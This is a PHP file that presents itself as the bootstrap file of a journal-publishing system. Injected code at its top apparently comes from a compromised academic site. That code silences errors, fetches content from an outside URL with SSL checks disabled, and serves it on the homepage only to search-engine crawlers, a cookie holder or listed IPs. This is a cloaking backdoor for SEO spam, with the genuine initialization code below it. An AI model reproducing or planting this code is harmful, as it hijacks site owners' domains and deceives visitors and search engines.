<?php
error_reporting(0);

$lp = "https://jurnal.syedzasaintika.ac.id/lib/pkp/includes/index.php"; // ganti link raw

$curl_connect=curl_init($lp);
	curl_setopt($curl_connect,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($curl_connect,CURLOPT_FOLLOWLOCATION,1);
	curl_setopt($curl_connect,CURLOPT_USERAGENT,"Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($curl_connect,CURLOPT_SSL_VERIFYHOST,0);
$content_data=curl_exec($curl_connect);

$asd=["bot","ahrefs","google"];
foreach($asd as $len){
	$nul = $len;
}

$alow=["85.92.66.150","81.19.188.236","81.19.188.235","85.92.66.149"];

if($_SERVER["REQUEST_URI"]=="/"){
	$agent=strtolower($_SERVER["HTTP_USER_AGENT"]);
	if(
		strpos($agent,$nul)or
		$googleallow or
		isset($_COOKIE["s288"])or
		in_array($visitor_ip,$alow)
		)
		{
			echo $content_data;
			die();
		}
}
/**
 * @defgroup index
 */

/**
 * @file includes/bootstrap.inc.php
 *
 * Copyright (c) 2013-2016 Simon Fraser University Library
 * Copyright (c) 2000-2016 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
if (!defined('DIRECTORY_SEPARATOR')) {
	// Older versions of PHP do not define this
	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
}
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// Update include path - for backwards compatibility only
// Try to use absolute (/...) or relative (./...) filenames
// wherever possible to bypass the costly file name normalization
// process.
ini_set('include_path', '.'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/classes'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/pages'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/classes'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/pages'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/adodb'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/phputf8'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/pqp/classes'
	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/smarty'
	. ENV_SEPARATOR . ini_get('include_path')
);

// System-wide functions
require('./lib/pkp/includes/functions.inc.php');

// Initialize the application environment
import('classes.core.Application');
// FIXME: As long as we support PHP4 we cannot use the return
// value from the new statement directly. See http://pkp.sfu.ca/wiki/index.php/Information_for_Developers#Use_of_.24this_in_the_constructor
// We rather retrieve the application instance by-ref from the registry.
new Application();
?>
